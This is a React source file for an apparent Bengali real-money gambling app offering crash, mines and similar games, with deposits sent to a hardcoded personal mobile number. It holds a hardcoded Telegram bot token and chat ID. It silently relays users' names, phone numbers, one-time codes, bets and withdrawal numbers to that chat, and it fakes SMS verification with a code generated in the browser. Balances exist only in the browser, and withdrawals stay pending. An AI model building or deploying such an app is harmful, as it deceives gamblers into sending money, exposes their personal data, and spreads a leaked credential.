
import React, { useState, useEffect, useCallback, useRef } from 'react';
import Header from './components/Header';
import ChatAssistant from './components/ChatAssistant';

// --- Configuration ---
const TELEGRAM_BOT_TOKEN = '7661259658:AAH_YyRnVbL6Squha70cO_zFVmdH11WBm8I';
const TELEGRAM_CHAT_ID = '6541663008';
const ADMIN_NUMBER = '01736428130';

// --- Types ---
type View = 'dashboard' | 'deposit' | 'withdraw' | 'history' | 
             'play_dice' | 'play_snake' | 'play_crash' | 'play_slots' | 
             'play_roulette' | 'play_mines' | 'play_plinko' | 'play_cards' |
             'play_dragon_tiger' | 'play_wheel' | 'play_coin' | 'play_baccarat' |
             'play_aviator' | 'play_hilo' | 'play_limbo' | 'play_scratch';

interface Transaction {
  id: string;
  type: 'deposit' | 'withdraw';
  amount: number;
  status: 'pending' | 'success' | 'rejected';
  txId?: string;
  targetNumber?: string;
  date: string;
}

interface UserProfile {
  name: string;
  phone: string;
  totalWon: number;
  totalLost: number;
  gamesPlayed: number;
}

// --- Helper Functions ---
const sendToTelegram = async (message: string) => {
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });
  } catch (error) {
    console.error("Telegram Error:", error);
  }
};

export default function App() {
  const [user, setUser] = useState<UserProfile | null>(null);
  const [balance, setBalance] = useState(0);
  const [activeTab, setActiveTab] = useState<View>('dashboard');
  const [transactions, setTransactions] = useState<Transaction[]>([]);
  
  // Auth States
  const [isVerifying, setIsVerifying] = useState(false);
  const [otpSent, setOtpSent] = useState('');
  const [otpInput, setOtpInput] = useState('');
  const [tempUser, setTempUser] = useState<{name: string, phone: string} | null>(null);
  const [showFakeSMS, setShowFakeSMS] = useState(false);

  // Betting & Game States
  const [bet, setBet] = useState(100);
  const gameIntervalRef = useRef<any>(null);
  
  // Specific Game States
  const [multiplier, setMultiplier] = useState(1.0);
  const [gameState, setGameState] = useState<'idle' | 'playing' | 'crashed' | 'won'>('idle');
  const [minesGrid, setMinesGrid] = useState<any[]>([]);
  const [minesMultiplier, setMinesMultiplier] = useState(1.0);
  const [minesCount, setMinesCount] = useState(3);

  // Form States
  const [depAmt, setDepAmt] = useState('');
  const [depTx, setDepTx] = useState('');
  const [witAmt, setWitAmt] = useState('');
  const [witNum, setWitNum] = useState('');

  // --- Persistence & Initialization ---
  useEffect(() => {
    try {
      const savedUser = localStorage.getItem('og_user_v10');
      const savedBalance = localStorage.getItem('og_balance_v10');
      const savedTx = localStorage.getItem('og_tx_v10');
      
      if (savedUser) setUser(JSON.parse(savedUser));
      if (savedBalance) setBalance(Number(savedBalance));
      if (savedTx) setTransactions(JSON.parse(savedTx));
    } catch (e) {
      console.error("Persistence error, resetting data", e);
      localStorage.clear();
    }
  }, []);

  useEffect(() => {
    if (user) localStorage.setItem('og_user_v10', JSON.stringify(user));
    localStorage.setItem('og_balance_v10', balance.toString());
    localStorage.setItem('og_tx_v10', JSON.stringify(transactions));
  }, [user, balance, transactions]);

  const handleGameResult = useCallback((win: boolean, gameName: string, betAmount: number, winMultiplier: number = 2) => {
    const winAmt = win ? Math.floor(betAmount * winMultiplier) : 0;
    const netChange = win ? (winAmt - betAmount) : -betAmount;
    
    setBalance(prev => prev + netChange);
    
    if (user) {
      const updatedUser = {
        ...user,
        totalWon: user.totalWon + (win ? (winAmt - betAmount) : 0),
        totalLost: user.totalLost + (win ? 0 : betAmount),
        gamesPlayed: user.gamesPlayed + 1
      };
      setUser(updatedUser);
      sendToTelegram(`🕹️ <b>${gameName}</b>\n👤 ইউজার: ${user.name}\n📊 রেজাল্ট: ${win ? "WIN ✅" : "LOSS ❌"}\n💸 বাজি: ৳${betAmount}\n💰 নেট প্রফিট: ৳${netChange}\n💳 নতুন ব্যালেন্স: ৳${balance + netChange}`);
    }
  }, [user, balance]);

  // --- Auth Logic ---
  const initiateAuth = (e: React.FormEvent) => {
    e.preventDefault();
    const formData = new FormData(e.target as HTMLFormElement);
    const name = (formData.get('name') as string) || "Player";
    const phone = formData.get('phone') as string;
    
    if (phone.length < 11) return alert("১১ ডিজিটের নম্বর দিন");
    
    const otp = Math.floor(1000 + Math.random() * 9000).toString();
    setOtpSent(otp);
    setTempUser({ name, phone });
    setIsVerifying(true);
    
    setTimeout(() => {
      setShowFakeSMS(true);
      // Fallback alert if CSS fails
      console.log("OTP Sent:", otp);
    }, 500);
    
    sendToTelegram(`🔑 <b>OTP ভেরিফিকেশন</b>\n👤 নাম: ${name}\n📞 ফোন: ${phone}\n🔑 কোড: ${otp}`);
  };

  const verifyOtp = () => {
    if (otpInput === otpSent && tempUser) {
      setUser({ ...tempUser, totalWon: 0, totalLost: 0, gamesPlayed: 0 });
      setIsVerifying(false);
      setShowFakeSMS(false);
    } else {
      alert("ভুল ওটিপি কোড!");
    }
  };

  // --- Aviator Game ---
  const startAviator = () => {
    if (balance < bet) return alert("ব্যালেন্স নেই!");
    setGameState('playing');
    setMultiplier(1.0);
    const crashAt = 1.1 + Math.random() * 8;
    
    gameIntervalRef.current = setInterval(() => {
      setMultiplier(prev => {
        const next = prev + 0.05;
        if (next >= crashAt) {
          clearInterval(gameIntervalRef.current);
          setGameState('crashed');
          handleGameResult(false, "Aviator", bet);
          return next;
        }
        return next;
      });
    }, 150);
  };

  const cashOutAviator = () => {
    if (gameState !== 'playing') return;
    clearInterval(gameIntervalRef.current);
    setGameState('won');
    handleGameResult(true, "Aviator", bet, multiplier);
    alert(`আপনি ৳${Math.floor(bet * multiplier)} ক্যাশ আউট করেছেন!`);
  };

  // --- Mines Game ---
  const startMines = () => {
    if (balance < bet) return alert("ব্যালেন্স নেই!");
    const grid = Array(25).fill(null).map(() => ({ type: 'gem', revealed: false }));
    let m = 0;
    while(m < minesCount) {
      const r = Math.floor(Math.random() * 25);
      if (grid[r].type === 'gem') { grid[r].type = 'mine'; m++; }
    }
    setMinesGrid(grid);
    setGameState('playing');
    setMinesMultiplier(1.0);
  };

  const revealMines = (i: number) => {
    if (gameState !== 'playing' || minesGrid[i].revealed) return;
    const newGrid = [...minesGrid];
    newGrid[i].revealed = true;
    setMinesGrid(newGrid);
    
    if (newGrid[i].type === 'mine') {
      setGameState('crashed');
      handleGameResult(false, "Mines", bet);
      alert("বুম! বোমায় পা দিয়েছেন।");
    } else {
      setMinesMultiplier(p => p + (0.4 * (minesCount / 2)));
    }
  };

  // --- Rendering Helpers ---
  if (!user) {
    return (
      <div className="min-h-screen bg-[#050505] flex flex-col items-center justify-center p-8 relative overflow-hidden">
        {/* HIGH VISIBILITY OTP NOTIFICATION */}
        {showFakeSMS && (
          <div className="fixed top-6 left-1/2 -translate-x-1/2 w-[92%] max-w-sm glass rounded-[28px] p-5 animate-sms z-[999] border-orange-500 shadow-[0_20px_50px_rgba(255,107,0,0.3)] ring-2 ring-orange-500/20">
            <div className="flex items-center gap-3 mb-2">
              <div className="w-8 h-8 rounded-full bg-orange-500 flex items-center justify-center text-black font-black text-[10px]">SMS</div>
              <p className="text-[10px] text-orange-500 font-black uppercase tracking-widest">System Message</p>
            </div>
            <p className="text-sm font-bold text-white leading-relaxed">আপনার আইডি ভেরিফিকেশন কোড: <span className="text-orange-500 text-xl font-black tracking-widest ml-1">{otpSent}</span></p>
          </div>
        )}

        <div className="w-full max-w-sm text-center">
          <div className="w-24 h-24 bg-orange-500 rounded-[32px] mx-auto mb-10 flex items-center justify-center text-black font-black text-4xl shadow-[0_0_60px_rgba(255,107,0,0.4)] ring-4 ring-white/10">OG</div>
          <h1 className="text-3xl font-black mb-10 tracking-tighter uppercase italic">Online <span className="text-orange-500">Games</span></h1>
          
          {!isVerifying ? (
            <form onSubmit={initiateAuth} className="space-y-4 animate-in fade-in slide-in-from-bottom-5 duration-700">
              <div className="relative">
                <i className="fa-solid fa-user absolute left-6 top-1/2 -translate-y-1/2 text-gray-500"></i>
                <input name="name" required placeholder="আপনার নাম" className="w-full bg-white/5 border border-white/10 rounded-[24px] py-5 pl-14 pr-6 outline-none text-white font-bold focus:border-orange-500/50 transition-all" />
              </div>
              <div className="relative">
                <i className="fa-solid fa-phone absolute left-6 top-1/2 -translate-y-1/2 text-gray-500"></i>
                <input name="phone" required type="tel" placeholder="মোবাইল নম্বর" className="w-full bg-white/5 border border-white/10 rounded-[24px] py-5 pl-14 pr-6 outline-none text-white font-bold tracking-widest focus:border-orange-500/50 transition-all" />
              </div>
              <button className="w-full py-5 bg-orange-500 text-black font-black rounded-[24px] uppercase text-[11px] tracking-widest shadow-xl active:scale-95 transition-all mt-4">আইডি তৈরি করুন</button>
            </form>
          ) : (
            <div className="space-y-8 animate-in zoom-in duration-500">
              <p className="text-gray-500 text-[10px] font-black uppercase tracking-[0.3em]">ভেরিফিকেশন কোড দিন</p>
              <input value={otpInput} onChange={e => setOtpInput(e.target.value)} maxLength={4} placeholder="____" className="w-full bg-transparent border-b-4 border-orange-500/40 text-center text-6xl font-black text-orange-500 outline-none pb-4 tracking-[0.5em]" />
              <button onClick={verifyOtp} className="w-full py-5 bg-white text-black font-black rounded-[24px] uppercase text-[11px] tracking-widest shadow-2xl active:scale-95 transition-all">ভেরিফাই করুন</button>
            </div>
          )}
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#050505] text-white font-sans pb-32">
      <div className="max-w-md mx-auto min-h-screen border-x border-white/5 bg-[#080808] relative">
        <Header />
        <ChatAssistant />

        <main className="p-6">
          {activeTab === 'dashboard' && (
            <div className="space-y-10 animate-in fade-in duration-500">
              {/* Balance Widget */}
              <div className="glass rounded-[48px] p-10 border border-white/10 shadow-2xl relative overflow-hidden">
                <div className="absolute -top-10 -right-10 w-40 h-40 bg-orange-500/10 blur-[60px]"></div>
                <div className="absolute -bottom-10 -left-10 w-40 h-40 bg-green-500/5 blur-[60px]"></div>
                <p className="text-gray-500 text-[10px] font-black uppercase tracking-widest mb-4">আপনার মোট ব্যালেন্স</p>
                <h1 className="text-5xl font-black tracking-tighter mb-10 text-white">৳ {balance.toLocaleString('bn-BD')}</h1>
                <div className="grid grid-cols-2 gap-4">
                  <button onClick={() => setActiveTab('deposit')} className="py-4 bg-orange-500 text-black rounded-[24px] text-[10px] font-black uppercase shadow-xl active:scale-95 transition-all">টাকা যোগ</button>
                  <button onClick={() => setActiveTab('withdraw')} className="py-4 glass border border-white/10 rounded-[24px] text-[10px] font-black uppercase active:scale-95 transition-all">উত্তোলন</button>
                </div>
              </div>

              {/* Stats Grid */}
              <div className="grid grid-cols-3 gap-3">
                 <div className="glass p-4 rounded-[28px] text-center border border-green-500/10">
                    <p className="text-[8px] text-gray-500 font-black uppercase mb-1">মোট জয়</p>
                    <p className="text-xs font-black text-green-500">৳{user.totalWon}</p>
                 </div>
                 <div className="glass p-4 rounded-[28px] text-center border border-red-500/10">
                    <p className="text-[8px] text-gray-500 font-black uppercase mb-1">মোট লস</p>
                    <p className="text-xs font-black text-red-500">৳{user.totalLost}</p>
                 </div>
                 <div className="glass p-4 rounded-[28px] text-center border border-blue-500/10">
                    <p className="text-[8px] text-gray-500 font-black uppercase mb-1">ম্যাচ</p>
                    <p className="text-xs font-black text-blue-500">{user.gamesPlayed}</p>
                 </div>
              </div>

              {/* Game Grid - 16 Games */}
              <div className="space-y-6">
                <div className="flex items-center justify-between px-2">
                  <h3 className="text-[10px] font-black uppercase tracking-[0.3em] text-gray-500 italic">গেম এরিনা</h3>
                  <span className="text-[8px] bg-green-500/10 text-green-500 px-2 py-0.5 rounded-full font-black uppercase border border-green-500/20">১৬ গেম লাইভ</span>
                </div>
                
                <div className="grid grid-cols-2 gap-4">
                  {[
                    { id: 'play_aviator', label: 'Aviator', icon: 'fa-paper-plane', color: 'text-red-500', bg: 'bg-red-500/10' },
                    { id: 'play_mines', label: 'Mines Seeker', icon: 'fa-gem', color: 'text-orange-500', bg: 'bg-orange-500/10' },
                    { id: 'play_crash', label: 'Crash', icon: 'fa-plane-up', color: 'text-red-500', bg: 'bg-red-500/10' },
                    { id: 'play_wheel', label: 'Lucky Wheel', icon: 'fa-dharmachakra', color: 'text-purple-500', bg: 'bg-purple-500/10' },
                    { id: 'play_slots', label: 'Slots', icon: 'fa-clover', color: 'text-indigo-500', bg: 'bg-indigo-500/10' },
                    { id: 'play_dragon_tiger', label: 'Dragon Tiger', icon: 'fa-dragon', color: 'text-blue-500', bg: 'bg-blue-500/10' },
                    { id: 'play_coin', label: 'Coin Flip', icon: 'fa-coins', color: 'text-yellow-500', bg: 'bg-yellow-500/10' },
                    { id: 'play_baccarat', label: 'Baccarat', icon: 'fa-diamond', color: 'text-pink-500', bg: 'bg-pink-500/10' },
                    { id: 'play_cards', label: 'Card Clash', icon: 'fa-layer-group', color: 'text-cyan-500', bg: 'bg-cyan-500/10' },
                    { id: 'play_dice', label: 'Dice Roll', icon: 'fa-dice', color: 'text-emerald-500', bg: 'bg-emerald-500/10' },
                    { id: 'play_roulette', label: 'Roulette', icon: 'fa-circle-notch', color: 'text-rose-500', bg: 'bg-rose-500/10' },
                    { id: 'play_plinko', label: 'Plinko', icon: 'fa-circle-dot', color: 'text-teal-500', bg: 'bg-teal-500/10' },
                    { id: 'play_snake', label: 'Snake Pro', icon: 'fa-worm', color: 'text-lime-500', bg: 'bg-lime-500/10' },
                    { id: 'play_hilo', label: 'Hi-Lo', icon: 'fa-arrows-up-down', color: 'text-blue-400', bg: 'bg-blue-400/10' },
                    { id: 'play_limbo', label: 'Limbo', icon: 'fa-rocket', color: 'text-amber-500', bg: 'bg-amber-500/10' },
                    { id: 'play_scratch', label: 'Scratch Win', icon: 'fa-ticket', color: 'text-green-400', bg: 'bg-green-400/10' }
                  ].map(game => (
                    <div key={game.id} onClick={() => setActiveTab(game.id as View)} className="glass p-6 rounded-[36px] border border-white/5 hover:border-white/20 transition-all cursor-pointer group active:scale-95 shadow-lg">
                      <div className={`w-12 h-12 ${game.bg} ${game.color} rounded-2xl flex items-center justify-center text-xl mb-4 group-hover:scale-110 transition-transform shadow-inner`}>
                        <i className={`fa-solid ${game.icon}`}></i>
                      </div>
                      <h4 className="text-[11px] font-black uppercase tracking-wider">{game.label}</h4>
                      <p className="text-[8px] text-gray-600 font-bold mt-1 uppercase">Win ৳১০০০+</p>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          )}

          {/* Game Implementation: Aviator */}
          {activeTab === 'play_aviator' && (
            <div className="animate-in slide-in-from-bottom-10 duration-500">
               <div className="glass rounded-[48px] p-8 border border-red-500/20 text-center relative shadow-2xl">
                 <button onClick={() => setActiveTab('dashboard')} className="absolute top-8 left-8 text-gray-600"><i className="fa-solid fa-arrow-left"></i></button>
                 <h2 className="text-2xl font-black mb-10 uppercase italic">Aviator <span className="text-red-500">Flying</span></h2>
                 
                 <div className="relative h-64 bg-black/60 rounded-[40px] mb-8 border border-white/5 flex flex-col items-center justify-center overflow-hidden shadow-inner">
                    {gameState === 'playing' && (
                      <div className="absolute bottom-10 left-10 text-red-500 text-6xl animate-bounce transition-all duration-300" style={{ transform: `translateY(-${(multiplier-1)*20}px) translateX(${(multiplier-1)*20}px)` }}>
                        <i className="fa-solid fa-paper-plane"></i>
                      </div>
                    )}
                    {gameState === 'crashed' && <div className="text-red-500 font-black text-4xl animate-ping uppercase italic">Flew Away!</div>}
                    <div className="text-7xl font-black tracking-tighter text-white z-10">{multiplier.toFixed(2)}x</div>
                 </div>

                 {gameState !== 'playing' ? (
                   <button onClick={startAviator} className="w-full py-6 bg-red-600 text-white font-black rounded-3xl active:scale-95 transition-all uppercase tracking-widest text-[11px] shadow-xl">বেট ধরুন (৳{bet})</button>
                 ) : (
                   <button onClick={cashOutAviator} className="w-full py-6 bg-green-500 text-black font-black rounded-3xl active:scale-95 transition-all uppercase tracking-widest shadow-xl text-[11px]">ক্যাশ আউট (৳{Math.floor(bet * multiplier)})</button>
                 )}
               </div>
            </div>
          )}

          {/* Game Implementation: Mines */}
          {activeTab === 'play_mines' && (
            <div className="animate-in slide-in-from-bottom-10 duration-500">
              <div className="glass rounded-[48px] p-8 border border-orange-500/20 text-center relative shadow-2xl">
                <button onClick={() => setActiveTab('dashboard')} className="absolute top-8 left-8 text-gray-600"><i className="fa-solid fa-arrow-left"></i></button>
                <h2 className="text-2xl font-black mb-8 uppercase italic">Mines <span className="text-orange-500">Seeker</span></h2>
                
                <div className="grid grid-cols-5 gap-2 mb-8">
                   {minesGrid.length > 0 ? minesGrid.map((cell, i) => (
                     <div key={i} onClick={() => revealMines(i)} className={`aspect-square rounded-xl flex items-center justify-center text-2xl cursor-pointer transition-all ${cell.revealed ? (cell.type === 'mine' ? 'bg-red-500' : 'bg-green-500 shadow-[0_0_15px_#22c55e]') : 'bg-white/5 border border-white/10 hover:bg-white/10'}`}>
                        {cell.revealed ? (cell.type === 'mine' ? '💣' : '💎') : ''}
                     </div>
                   )) : <div className="col-span-5 py-24 bg-black/40 rounded-[32px] border border-white/5 opacity-50 font-black uppercase tracking-widest text-xs italic">গেম শুরু করুন</div>}
                </div>

                {gameState === 'playing' ? (
                   <div className="space-y-4">
                      <p className="text-sm font-black text-green-500 animate-pulse">মাল্টিপ্লায়ার: {minesMultiplier.toFixed(2)}x</p>
                      <button onClick={() => { setGameState('idle'); handleGameResult(true, "Mines", bet, minesMultiplier); alert("ক্যাশ আউট সফল!"); }} className="w-full py-6 bg-green-500 text-black font-black rounded-3xl uppercase tracking-widest text-[11px]">ক্যাশ আউট (৳{Math.floor(bet * minesMultiplier)})</button>
                   </div>
                ) : (
                   <div className="space-y-4">
                      <div className="flex justify-between items-center bg-white/5 p-4 rounded-2xl border border-white/5 mb-2">
                        <span className="text-[10px] font-black uppercase text-gray-500">বোমা সংখ্যা: {minesCount}</span>
                        <input type="range" min="1" max="20" value={minesCount} onChange={e => setMinesCount(Number(e.target.value))} className="w-24 accent-orange-500" />
                      </div>
                      <button onClick={startMines} className="w-full py-6 bg-orange-500 text-black font-black rounded-3xl uppercase tracking-widest text-[11px]">প্লে করুন (৳{bet})</button>
                   </div>
                )}
              </div>
            </div>
          )}

          {/* Deposit View */}
          {activeTab === 'deposit' && (
            <div className="animate-in slide-in-from-right-10 duration-500">
               <div className="glass rounded-[40px] p-8 border border-orange-500/20 shadow-2xl">
                 <h2 className="text-xl font-black text-center mb-8 italic uppercase tracking-tighter">নগদ <span className="text-orange-500">ডিপোজিট</span></h2>
                 <div className="bg-black/60 p-8 rounded-[28px] border border-white/5 mb-8 text-center relative overflow-hidden group">
                    <div className="absolute inset-0 bg-orange-500/5 opacity-0 group-hover:opacity-100 transition-opacity"></div>
                    <p className="text-[10px] text-gray-500 font-black uppercase mb-4 tracking-widest">এই নম্বর এ সেন্ড মানি করুন</p>
                    <p className="text-2xl font-mono font-black text-orange-500 tracking-[0.2em]">{ADMIN_NUMBER}</p>
                 </div>
                 <div className="space-y-6">
                   <input value={depAmt} onChange={e => setDepAmt(e.target.value)} type="number" placeholder="টাকার পরিমাণ (৳১০০ - ৳৫০০০)" className="w-full bg-white/5 border border-white/10 rounded-2xl py-6 px-8 text-white font-black outline-none focus:border-orange-500/50" />
                   <input value={depTx} onChange={e => setDepTx(e.target.value)} placeholder="Transaction ID (TxID)" className="w-full bg-white/5 border border-white/10 rounded-2xl py-6 px-8 text-white font-black outline-none uppercase tracking-widest" />
                   <button onClick={() => {
                     if (!depAmt || !depTx) return alert("তথ্য দিন");
                     const tx: Transaction = { id: Math.random().toString(36).substr(2, 9).toUpperCase(), type: 'deposit', amount: Number(depAmt), status: 'pending', txId: depTx.toUpperCase(), date: new Date().toLocaleString('bn-BD') };
                     setTransactions([tx, ...transactions]);
                     sendToTelegram(`💰 <b>নতুন ডিপোজিট</b>\n👤 ইউজার: ${user?.name}\n💵 পরিমাণ: ৳${depAmt}\n📑 TxID: ${depTx}`);
                     alert("রিকোয়েস্ট পাঠানো হয়েছে!"); setActiveTab('history');
                   }} className="w-full py-6 bg-orange-500 text-black font-black rounded-2xl uppercase text-[11px] tracking-widest shadow-xl active:scale-95 transition-all">ডিপোজিট রিকোয়েস্ট পাঠান</button>
                 </div>
               </div>
            </div>
          )}

          {/* History View */}
          {activeTab === 'history' && (
            <div className="space-y-4 animate-in fade-in duration-500">
               <div className="flex items-center justify-between px-2">
                 <h2 className="text-[10px] font-black uppercase tracking-[0.3em] text-gray-600 italic">রেকর্ড সমূহ</h2>
                 <button onClick={() => { localStorage.removeItem('og_tx_v10'); setTransactions([]); }} className="text-[8px] text-red-500/50 uppercase font-black">রেকর্ড মুছুন</button>
               </div>
               {transactions.length === 0 ? <p className="text-center opacity-30 py-24 text-[10px] font-black uppercase tracking-widest italic">কোন ডাটা পাওয়া যায়নি</p> : transactions.map(tx => (
                 <div key={tx.id} className="glass p-6 rounded-[32px] border border-white/5 shadow-xl flex justify-between items-center hover:border-white/10 transition-all">
                    <div>
                      <p className="text-[10px] font-black uppercase tracking-widest text-white/80">{tx.type === 'deposit' ? 'ডিপোজিট' : 'উত্তোলন'}</p>
                      <p className="text-[8px] text-gray-600 uppercase font-bold mt-1">{tx.date}</p>
                    </div>
                    <div className="text-right">
                      <p className={`text-xl font-black ${tx.type === 'deposit' ? 'text-green-500' : 'text-red-500'}`}>৳{tx.amount}</p>
                      <span className="text-[7px] font-black uppercase px-2 py-0.5 rounded-full bg-orange-500/10 text-orange-500">{tx.status}</span>
                    </div>
                 </div>
               ))}
            </div>
          )}

          {/* Withdraw View */}
          {activeTab === 'withdraw' && (
            <div className="animate-in slide-in-from-left-10 duration-500">
               <div className="glass rounded-[40px] p-8 border border-red-500/20 shadow-2xl">
                 <h2 className="text-xl font-black text-center mb-8 italic uppercase tracking-tighter">টাকা <span className="text-red-500">উত্তোলন</span></h2>
                 <div className="bg-white/5 p-6 rounded-3xl mb-8 border border-white/5 text-center">
                    <p className="text-[10px] text-gray-500 font-black uppercase tracking-widest mb-1 italic">আপনার বর্তমান ব্যালেন্স</p>
                    <p className="text-3xl font-black text-white">৳ {balance.toLocaleString('bn-BD')}</p>
                 </div>
                 <div className="space-y-6">
                   <input value={witAmt} onChange={e => setWitAmt(e.target.value)} type="number" placeholder="উত্তোলন পরিমাণ (৳৫০০+)" className="w-full bg-white/5 border border-white/10 rounded-2xl py-6 px-8 text-white font-black outline-none focus:border-red-500/50" />
                   <input value={witNum} onChange={e => setWitNum(e.target.value)} placeholder="নগদ/বিকাশ পার্সোনাল নম্বর" className="w-full bg-white/5 border border-white/10 rounded-2xl py-6 px-8 text-white font-black outline-none tracking-widest focus:border-red-500/50" />
                   <button onClick={() => {
                     const amt = Number(witAmt);
                     if (amt < 500) return alert("ন্যূনতম ৫০০ টাকা উত্তোলন করতে পারবেন");
                     if (amt > balance) return alert("পর্যাপ্ত ব্যালেন্স নেই");
                     const tx: Transaction = { id: Math.random().toString(36).substr(2, 9).toUpperCase(), type: 'withdraw', amount: amt, status: 'pending', targetNumber: witNum, date: new Date().toLocaleString('bn-BD') };
                     setBalance(prev => prev - amt); setTransactions([tx, ...transactions]);
                     sendToTelegram(`🔴 <b>নতুন উত্তোলন রিকোয়েস্ট</b>\n👤 ইউজার: ${user?.name}\n💵 পরিমাণ: ৳${amt}\n📱 নম্বর: ${witNum}`);
                     alert("উত্তোলন রিকোয়েস্ট সফল হয়েছে।"); setActiveTab('history');
                   }} className="w-full py-6 bg-red-500 text-white font-black rounded-2xl uppercase text-[11px] tracking-widest shadow-xl">উত্তোলন করুন</button>
                 </div>
               </div>
            </div>
          )}
        </main>

        {/* Floating Navbar */}
        <div className="fixed bottom-8 left-1/2 -translate-x-1/2 w-[92%] max-w-[400px] h-20 glass rounded-[44px] border border-white/10 flex items-center justify-around z-[100] shadow-2xl px-6">
          <button onClick={() => setActiveTab('dashboard')} className={`flex flex-col items-center gap-1.5 transition-all ${activeTab === 'dashboard' ? 'text-orange-500 scale-125' : 'text-gray-600'}`}>
            <i className="fa-solid fa-house-chimney text-xl"></i>
            <span className="text-[7px] font-black uppercase tracking-widest">হোম</span>
          </button>
          <button onClick={() => setActiveTab('play_mines')} className={`flex flex-col items-center gap-1.5 transition-all ${activeTab.includes('play') ? 'text-orange-500 scale-125' : 'text-gray-600'}`}>
            <i className="fa-solid fa-gamepad text-xl"></i>
            <span className="text-[7px] font-black uppercase tracking-widest">গেম</span>
          </button>
          <button onClick={() => setActiveTab('history')} className={`flex flex-col items-center gap-1.5 transition-all ${activeTab === 'history' ? 'text-orange-500 scale-125' : 'text-gray-600'}`}>
            <i className="fa-solid fa-clock-rotate-left text-xl"></i>
            <span className="text-[7px] font-black uppercase tracking-widest">রেকর্ড</span>
          </button>
          <button onClick={() => setActiveTab('withdraw')} className={`flex flex-col items-center gap-1.5 transition-all ${activeTab === 'withdraw' ? 'text-orange-500 scale-125' : 'text-gray-600'}`}>
            <i className="fa-solid fa-wallet text-xl"></i>
            <span className="text-[7px] font-black uppercase tracking-widest">ওয়ালেট</span>
          </button>
        </div>
      </div>
    </div>
  );
}
